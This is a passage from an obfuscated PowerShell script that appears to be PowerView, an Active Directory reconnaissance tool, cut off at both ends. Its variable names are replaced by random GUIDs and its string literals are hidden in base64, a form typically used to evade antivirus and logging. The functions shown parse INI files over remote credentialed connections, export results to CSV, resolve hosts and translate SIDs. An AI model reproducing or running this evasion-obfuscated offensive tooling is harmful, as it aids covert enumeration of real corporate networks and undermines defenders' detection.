IAdAB5AE4AYQBtAGUAfABWAGEAbAB1AGUARgByAG8AbQBSAGUAbQBhAGkAbgBpAG4AZw
BBAHIAZwB1AG0AZQBuAHQAcwApACQA')))
            
${abba94f0590b4384bb628da76537a882} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgAoAEEAbABsAG8AdwBOAHUAbABsAHwAQQBsAGwAbwB3AEUAbQBwAHQAeQBTAHQAcg
BpAG4AZwB8AEEAbABsAG8AdwBFAG0AcAB0AHkAQwBvAGwAbABlAGMAdABpAG8AbgB8AF
YAYQBsAGkAZABhAHQAZQBDAG8AdQBuAHQAfABWAGEAbABpAGQAYQB0AGUATABlAG4AZw
B0AGgAfABWAGEAbABpAGQAYQB0AGUAUABhAHQAdABlAHIAbgB8AFYAYQBsAGkAZABhAH
QAZQBSAGEAbgBnAGUAfABWAGEAbABpAGQAYQB0AGUAUwBjAHIAaQBwAHQAfABWAGEAbA
BpAGQAYQB0AGUAUwBlAHQAfABWAGEAbABpAGQAYQB0AGUATgBvAHQATgB1AGwAbAB8AF
YAYQBsAGkAZABhAHQAZQBOAG8AdABOAHUAbABsAE8AcgBFAG0AcAB0AHkAKQAkAA==')
))
            ${113c38165ec94ec9bc3596b612d3716b} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBBAGwAaQBhAHMAJAA=')))
            
${7c39816a7c874e729c772da68f1d00eb} = New-Object -TypeName 
System.Management.Automation.ParameterAttribute
            switch -
regex ($PSBoundParameters.Keys) {
                
${0e4e5b91e6c048e68306d3e606465eb9} {
                    Try {
       
                 ${7c39816a7c874e729c772da68f1d00eb}.$_ = . 
${ce9d88df51894091b1dc14b7dad06e3d}
                    }
             
       Catch {
                        $_
                    }
        
            continue
                }
            }
            if
(${68e24da754d34c91816e71b0c5809c65}.Keys -contains $Name) {
         
       ${68e24da754d34c91816e71b0c5809c65}.$Name.Attributes.Add
(${7c39816a7c874e729c772da68f1d00eb})
            }
            else 
{
                ${ccc67237d2644ccc98f98e6a84161335} = New-Object -
TypeName Collections.ObjectModel.Collection[System.Attribute]
        
        switch -regex ($PSBoundParameters.Keys) {
                    
${abba94f0590b4384bb628da76537a882} {
                        Try {
   
                         ${e80dd4fdf48d419685bd85e90ad8f8e2} = New-
Object -TypeName $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdA
BpAG8AbgAuACQAewBfAH0AQQB0AHQAcgBpAGIAdQB0AGUA'))) -ArgumentList (. 
${ce9d88df51894091b1dc14b7dad06e3d}) -ErrorAction Stop
               
             ${ccc67237d2644ccc98f98e6a84161335}.Add
(${e80dd4fdf48d419685bd85e90ad8f8e2})
                        }
       
                 Catch { $_ }
                        continue
        
            }
                    ${113c38165ec94ec9bc3596b612d3716b} 
{
                        Try {
                            
${dfeccfe9c9e84d23a341a7c3c16ee197} = New-Object -TypeName 
System.Management.Automation.AliasAttribute -ArgumentList (. 
${ce9d88df51894091b1dc14b7dad06e3d}) -ErrorAction Stop
               
             ${ccc67237d2644ccc98f98e6a84161335}.Add
(${dfeccfe9c9e84d23a341a7c3c16ee197})
                            
continue
                        }
                        Catch { $_ 
}
                    }
                }
                
${ccc67237d2644ccc98f98e6a84161335}.Add
(${7c39816a7c874e729c772da68f1d00eb})
                
${eb9d1592bf8543a6beac6ea449455a8a} = New-Object -TypeName 
System.Management.Automation.RuntimeDefinedParameter -ArgumentList 
@($Name, $Type, ${ccc67237d2644ccc98f98e6a84161335})
                
${68e24da754d34c91816e71b0c5809c65}.Add($Name, 
${eb9d1592bf8543a6beac6ea449455a8a})
            }
        }
    }
    
End {
        if(!$CreateVariables -and !$Dictionary) {
            
${68e24da754d34c91816e71b0c5809c65}
        }
    }
}
function Get-
IniContent {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    
[CmdletBinding()]
    Param(
        [Parameter(Position = 0, 
Mandatory = $True, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 
'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        
$Path,
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [Switch]
        
$OutputObject
    )
    BEGIN {
        
${6a36a79de18f43b1a0a59794f4ad66dc} = @{}
    }
    PROCESS {
        
ForEach (${2b1cd794316846babc6cf4a4a6510811} in $Path) {
            
if ((${2b1cd794316846babc6cf4a4a6510811} -Match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                
${9275e39a12134a3fa8e1806664964155} = (New-Object System.Uri
(${2b1cd794316846babc6cf4a4a6510811})).Host
                if (-not 
${6a36a79de18f43b1a0a59794f4ad66dc}
[${9275e39a12134a3fa8e1806664964155}]) {
                    Add-
RemoteConnection -ComputerName ${9275e39a12134a3fa8e1806664964155} 
-Credential $Credential
                    
${6a36a79de18f43b1a0a59794f4ad66dc}
[${9275e39a12134a3fa8e1806664964155}] = $True
                }
       
     }
            if (Test-Path -Path 
${2b1cd794316846babc6cf4a4a6510811}) {
                if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) 
{
                    ${8dc5acbc43a2461d95f016d801c3149f} = New-
Object PSObject
                }
                else {
               
     ${8dc5acbc43a2461d95f016d801c3149f} = @{}
                }
      
          Switch -Regex -File ${2b1cd794316846babc6cf4a4a6510811} {
  
                  $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('XgBcAFsAKAAuACsAKQBcAF0A'))) 
          
          {
                        
${9b9d328aa3264849b6859d7e02423114} = $matches[1].Trim()
             
           if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                           
 ${9b9d328aa3264849b6859d7e02423114} = 
${9b9d328aa3264849b6859d7e02423114}.Replace(' ', '')
                 
           ${92e4ef98acdc4768a6f78ca2b2cc77a9} = New-Object 
PSObject
                            
${8dc5acbc43a2461d95f016d801c3149f} | Add-Member Noteproperty 
${9b9d328aa3264849b6859d7e02423114} 
${92e4ef98acdc4768a6f78ca2b2cc77a9}
                        }
         
               else {
                            
${8dc5acbc43a2461d95f016d801c3149f}
[${9b9d328aa3264849b6859d7e02423114}] = @{}
                        
}
                        ${2d7758a0e431400a898b15d58a789241} = 0
     
               }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgAoADsALgAqACkAJAA='))) 
                    {
                     
   $Value = $matches[1].Trim()
                        
${2d7758a0e431400a898b15d58a789241} = 
${2d7758a0e431400a898b15d58a789241} + 1
                        $Name 
= $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AbQBlAG4AdAA='))) + ${2d7758a0e431400a898b15d58a789241}
     
                   if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                           
 $Name = $Name.Replace(' ', '')
                            
${8dc5acbc43a2461d95f016d801c3149f}.
${9b9d328aa3264849b6859d7e02423114} | Add-Member Noteproperty $Name 
$Value
                        }
                        else {
        
                    ${8dc5acbc43a2461d95f016d801c3149f}
[${9b9d328aa3264849b6859d7e02423114}][$Name] = $Value
                
        }
                    }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAuACsAPwApAFwAcwAqAD0AKAAuACoAKQA='))) 
                    {
     
                   $Name, $Value = $matches[1..2]
                    
    $Name = $Name.Trim()
                        
${0b155bfc678c496cb9c5a1298c0404d4} = $Value.split(',') | ForEach-
Object { $_.Trim() }
                        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                           
 $Name = $Name.Replace(' ', '')
                            
${8dc5acbc43a2461d95f016d801c3149f}.
${9b9d328aa3264849b6859d7e02423114} | Add-Member Noteproperty $Name 
${0b155bfc678c496cb9c5a1298c0404d4}
                        }
         
               else {
                            
${8dc5acbc43a2461d95f016d801c3149f}
[${9b9d328aa3264849b6859d7e02423114}][$Name] = 
${0b155bfc678c496cb9c5a1298c0404d4}
                        }
         
           }
                }
                
${8dc5acbc43a2461d95f016d801c3149f}
            }
        }
    }
    
END {
        ${6a36a79de18f43b1a0a59794f4ad66dc}.Keys | Remove-
RemoteConnection
    }
}
function Export-PowerViewCSV {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        
[Parameter(Mandatory = $True, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        
[System.Management.Automation.PSObject[]]
        $InputObject,
       
 [Parameter(Mandatory = $True, Position = 1)]
        
[ValidateNotNullOrEmpty()]
        [String]
        $Path,
        
[Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        
[Char]
        $Delimiter = ',',
        [Switch]
        $Append
    )
  
  BEGIN {
        ${92941ac564a74e06b399dd5e0044537e} = 
[IO.Path]::GetFullPath($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABhAHQAaAA=')))])
        ${94e6523506774e86bb820a50a8b5861a} = 
[System.IO.File]::Exists(${92941ac564a74e06b399dd5e0044537e})
        
${eb2d5c85bd484385b6ddfc9a3da6f780} = New-Object 
System.Threading.Mutex $False,$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBTAFYATQB1AHQAZQB4AA==')))
        
$Null = ${eb2d5c85bd484385b6ddfc9a3da6f780}.WaitOne()
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QQBwAHAAZQBuAGQA')))]) {
            
${f419fecf157240f5b1286598097baca9} = [System.IO.FileMode]::Append
   
     }
        else {
            ${f419fecf157240f5b1286598097baca9} 
= [System.IO.FileMode]::Create
            
${94e6523506774e86bb820a50a8b5861a} = $False
        }
        
${a3a7a454d6ff459b80b4939a19725244} = New-Object IO.FileStream
(${92941ac564a74e06b399dd5e0044537e}, 
${f419fecf157240f5b1286598097baca9}, [System.IO.FileAccess]::Write, 
[IO.FileShare]::Read)
        ${3f767aec8c4b430c929993ccf24a2087} = 
New-Object System.IO.StreamWriter
(${a3a7a454d6ff459b80b4939a19725244})
        
${3f767aec8c4b430c929993ccf24a2087}.AutoFlush = $True
    }
    
PROCESS {
        ForEach (${325030b50e5d4e96be02a5e3ef70a9a8} in 
$InputObject) {
            ${bfe4ddd3047a48458a3982c45a7d91ad} = 
ConvertTo-Csv -InputObject ${325030b50e5d4e96be02a5e3ef70a9a8} -
Delimiter $Delimiter -NoTypeInformation
            if (-not 
${94e6523506774e86bb820a50a8b5861a}) {
                
${bfe4ddd3047a48458a3982c45a7d91ad} | ForEach-Object { 
${3f767aec8c4b430c929993ccf24a2087}.WriteLine($_) }
                
${94e6523506774e86bb820a50a8b5861a} = $True
            }
            
else {
                ${bfe4ddd3047a48458a3982c45a7d91ad}[1..
(${bfe4ddd3047a48458a3982c45a7d91ad}.Length-1)] | ForEach-Object { 
${3f767aec8c4b430c929993ccf24a2087}.WriteLine($_) }
            }
     
   }
    }
    END {
        
${eb2d5c85bd484385b6ddfc9a3da6f780}.ReleaseMutex()
        
${3f767aec8c4b430c929993ccf24a2087}.Dispose()
        
${a3a7a454d6ff459b80b4939a19725244}.Dispose()
    }
}
function 
Resolve-IPAddress {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('System.Management.Automation.PSCustomObject')]
    [CmdletBinding
()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = 
$True, ValueFromPipelineByPropertyName = $True)]
        [Alias
('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty
()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME
    )
  
  PROCESS {
        ForEach (${9c0baec859734fc983ee3c04b4cde8a7} in 
$ComputerName) {
            try {
                @
(([Net.Dns]::GetHostEntry
(${9c0baec859734fc983ee3c04b4cde8a7})).AddressList) | ForEach-Object 
{
                    if ($_.AddressFamily -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBuAHQAZQByAE4AZQB0AHcAbwByAGsA')))) {
                        
${6f675a112d04499c838f32bbba9fa15a} = New-Object PSObject
            
            ${6f675a112d04499c838f32bbba9fa15a} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${9c0baec859734fc983ee3c04b4cde8a7}
                        
${6f675a112d04499c838f32bbba9fa15a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBQAEEAZABkAHIAZQBzAHMA'))) $_.IPAddressToString
                  
      ${6f675a112d04499c838f32bbba9fa15a}
                    }
       
         }
            }
            catch {
                Write-
Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBSAGUAcwBvAGwAdgBlAC0ASQBQAEEAZABkAHIAZQBzAHMAXQAgAEMAbwB1AGwAZA
AgAG4AbwB0ACAAcgBlAHMAbwBsAHYAZQAgACQAewA5AGMAMABiAGEAZQBjADgANQA5AD
cAMwA0AGYAYwA5ADgAMwBlAGUAMwBjADAANABiADQAYwBkAGUAOABhADcAfQAgAHQAbw
AgAGEAbgAgAEkAUAAgAEEAZABkAHIAZQBzAHMALgA=')))
            }
        
}
    }
}
function ConvertTo-SID {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType([String])]
    
[CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('Name', 'Identity')]
        [String[]]
        
$ObjectName,
        [ValidateNotNullOrEmpty()]
        [String]
       
 $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias
('DomainController')]
        [String]
        $Server,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${584dc5f06b2d40ecafc762a377d8635f} = @{}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${584dc5f06b2d40ecafc762a377d8635f}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))]) { ${584dc5f06b2d40ecafc762a377d8635f}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${584dc5f06b2d40ecafc762a377d8635f}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS 
{
        ForEach ($Object in $ObjectName) {
            $Object = 
$Object -Replace '/','\'
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                
${7ad98b42cd2445ecb64347a50a5e7833} = Convert-ADName -Identity 
$Object -OutputType 'DN' @584dc5f06b2d40ecafc762a377d8635f
           
     if (${7ad98b42cd2445ecb64347a50a5e7833}) {
                    
$UserDomain = ${7ad98b42cd2445ecb64347a50a5e7833}.SubString
(${7ad98b42cd2445ecb64347a50a5e7833}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
       
             ${e0e6b6d01ca04c90bf52fb20f9e41317} = 
${7ad98b42cd2445ecb64347a50a5e7833}.Split(',')[0].split('=')[1]
      
              ${584dc5f06b2d40ecafc762a377d8635f}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = 
${e0e6b6d01ca04c90bf52fb20f9e41317}
                    
${584dc5f06b2d40ecafc762a377d8635f}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $UserDomain
                    
${584dc5f06b2d40ecafc762a377d8635f}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bwBiAGoAZQBjAHQAcwBpAGQA')))
                    Get-DomainObject 
@584dc5f06b2d40ecafc762a377d8635f | Select-Object -Expand objectsid
  
              }
            }
            else {
                try {
  
                  if ($Object.Contains('\')) {
                       
 $Domain = $Object.Split('\')[0]
                        $Object = 
$Object.Split('\')[1]
                    }
                    elseif 
(-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
               
         ${584dc5f06b2d40ecafc762a377d8635f} = @{}
                   
     $Domain = (Get-Domain @584dc5f06b2d40ecafc762a377d8635f).Name
   
                 }
                    
${5d9738a0ddc9456696e1aabf5d0d85e3} = (New-Object 
System.Security.Principal.NTAccount($Domain, $Object))
               
     ${5d9738a0ddc9456696e1aabf5d0d85e3}.Translate
([System.Security.Principal.SecurityIdentifier]).Value
               
 }
                catch {
                    Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBDAG8AbgB2AGUAcgB0AFQAbwAtAFMASQBEAF0AIABFAHIAcgBvAHIAIABjAG8Abg
B2AGUAcgB0AGkAbgBnACAAJABEAG8AbQBhAGkAbgBcACQATwBiAGoAZQBjAHQAIAA6AC
AAJABfAA==')))
                }
            }
        }
    }
}
function 
ConvertFrom-SID {
    [OutputType([String])]
    [CmdletBinding()]
    
Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = 
$True, ValueFromPipelineByPropertyName = $True)]
        [Alias
('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
       
 $ObjectSid,
        [ValidateNotNullOrEmpty()]
        [String]
       
 $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias
('DomainController')]
        [String]
        $Server,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${e95ff9a0cfb548dba5f1385fe67fc468} = @{}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${e95ff9a0cfb548dba5f1385fe67fc468}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))]) { ${e95ff9a0cfb548dba5f1385fe67fc468}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${e95ff9a0cfb548dba5f1385fe67fc468}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS 
{
        ForEach (${e12fad257af9417d951d1e88fc2951fd} in $ObjectSid) 
{
            ${e12fad257af9417d951d1e88fc2951fd} = 
${e12fad257af9417d951d1e88fc2951fd}.trim('*')
            try {
       
         Switch (${e12fad257af9417d951d1e88fc2951fd}) {
              
      $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwAtADEALQAwAA==')))         { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgB1AGwAbAAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQAwAC0AMAA=')))       { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBvAGIAbwBkAHkA'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQAxAA==')))         { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwBvAHIAbABkACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQAxAC0AMAA=')))       { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RQB2AGUAcgB5AG8AbgBlAA=='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQAyAA==')))         { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABvAGMAYQBsACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQAyAC0AMAA=')))       { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABvAGMAYQBsAA=='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQAyAC0AMQA=')))       { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG4AcwBvAGwAZQAgAEwAbwBnAG8AbgAgAA=='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQAzAA==')))         { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAYQB0AG8AcgAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
             
       $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwAtADEALQAzAC0AMAA=')))       { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAYQB0AG8AcgAgAE8AdwBuAGUAcgA='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQAzAC0AMQA=')))       { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAYQB0AG8AcgAgAEcAcgBvAHUAcAA='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQAzAC0AMgA=')))       { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAYQB0AG8AcgAgAE8AdwBuAGUAcgAgAFMAZQByAHYAZQByAA=='))) }
     
               $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwAtADEALQAzAC0AMwA=')))       { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAYQB0AG8AcgAgAEcAcgBvAHUAcAAgAFMAZQByAHYAZQByAA=='))) }
     
               $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwAtADEALQAzAC0ANAA=')))       { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwB3AG4AZQByACAAUgBpAGcAaAB0AHMA'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA0AA==')))         { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBvAG4ALQB1AG4AaQBxAHUAZQAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
     
               $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwAtADEALQA1AA==')))         { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMQA=')))       { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABpAGEAbAB1AHAA'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMgA=')))       { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBlAHQAdwBvAHIAawA='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwA=')))       { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBhAHQAYwBoAA=='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0ANAA=')))       { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBuAHQAZQByAGEAYwB0AGkAdgBlAA=='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0ANgA=')))       { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBpAGMAZQA='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0ANwA=')))       { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBuAG8AbgB5AG0AbwB1AHMA'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AOAA=')))       { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AeAB5AA=='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AOQA=')))       { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RQBuAHQAZQByAHAAcgBpAHMAZQAgAEQAbwBtAGEAaQBuACAAQwBvAG4AdAByAG8AbA
BsAGUAcgBzAA=='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMQAwAA==')))      { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAGkAbgBjAGkAcABhAGwAIABTAGUAbABmAA=='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMQAxAA==')))      { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQB1AHQAaABlAG4AdABpAGMAYQB0AGUAZAAgAFUAcwBlAHIAcwA='))) }
         
           $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAyAA==')))      { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdAByAGkAYwB0AGUAZAAgAEMAbwBkAGUA'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMQAzAA==')))      { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABlAHIAbQBpAG4AYQBsACAAUwBlAHIAdgBlAHIAIABVAHMAZQByAHMA'))) }
     
               $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA0AA==')))      { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAG0AbwB0AGUAIABJAG4AdABlAHIAYQBjAHQAaQB2AGUAIABMAG8AZwBvAG4A')
)) }
                    $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA1AA==')))      { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABoAGkAcwAgAE8AcgBnAGEAbgBpAHoAYQB0AGkAbwBuACAA'))) }
             
       $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA3AA==')))      { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABoAGkAcwAgAE8AcgBnAGEAbgBpAHoAYQB0AGkAbwBuACAA'))) }
             
       $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA4AA==')))      { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABvAGMAYQBsACAAUwB5AHMAdABlAG0A'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMQA5AA==')))      { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMgAwAA==')))      { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AOAAwAC0AMAA=')))    { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBsAGwAIABTAGUAcgB2AGkAYwBlAHMAIAA='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))  { 
